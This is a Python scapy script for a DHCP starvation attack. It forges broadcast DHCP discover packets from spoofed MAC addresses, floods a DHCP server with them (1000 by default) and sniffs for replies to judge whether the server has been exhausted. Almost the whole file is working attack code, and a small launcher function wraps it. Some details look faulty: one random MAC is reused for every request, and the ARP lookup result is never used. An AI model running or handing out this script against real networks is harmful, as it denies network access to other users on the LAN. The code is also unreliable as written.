from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP
from scapy.all import sendp, RandMAC, conf
from scapy.layers.l2 import Ether
from scapy.layers.dhcp import DHCP, BOOTP, IP
from scapy.layers.inet import UDP

def dhcp_discover(spoofed_mac, i_face):
    """
    sending dhcp discover from the spoofed mac address (broadcast)

    :param spoofed_mac: fake mac address
    :param i_face: the systems network interface for the attack
    """
    ip_dest = '255.255.255.255'
    mac_dest = "ff:ff:ff:ff:ff:ff"
    dsc = Ether(src=mac2str(spoofed_mac), dst=mac_dest, type=0x0800)
    dsc /= IP(src='0.0.0.0', dst=ip_dest)
    dsc /= UDP(sport=68, dport=67)
    dsc /= BOOTP(chaddr=mac2str(spoofed_mac),
                 xid=random.randint(1, 1000000000),
                 flags=0xFFFFFF)
    dsc /= DHCP(options=[("message-type", "discover"),
                         "end"])
    sendp(dsc, iface=i_face)

def test_initial_dhcp(spoofed_mac, i_face):
    dhcp_discover(spoofed_mac=spoofed_mac, i_face=i_face)
    p = sniff(count=1, filter="udp and (port 67 or 68)", timeout=3)
    return len(p) > 0

def starve(target_ip=0, i_face=conf.iface, num_requests=1000):
    cur_ip = 0
    if target_ip:
        server_mac = sr1(ARP(op=1, pdst=str(target_ip)))[0][ARP].hwsrc
    mac = RandMAC()

    # Test the initial DHCP request
    if not test_initial_dhcp(spoofed_mac=mac, i_face=i_face):
        return True

    # Send many DHCP requests
    for _ in range(num_requests):
        dhcp_discover(spoofed_mac=mac, i_face=i_face)

    # Test the final DHCP request
    if not test_initial_dhcp(spoofed_mac=mac, i_face=i_face):
        return False

    return True

def lancheur_starv(interface, num_requests_user):
    success = starve(i_face=interface, num_requests=num_requests_user)
    if success:
        return False
    else:
        return True
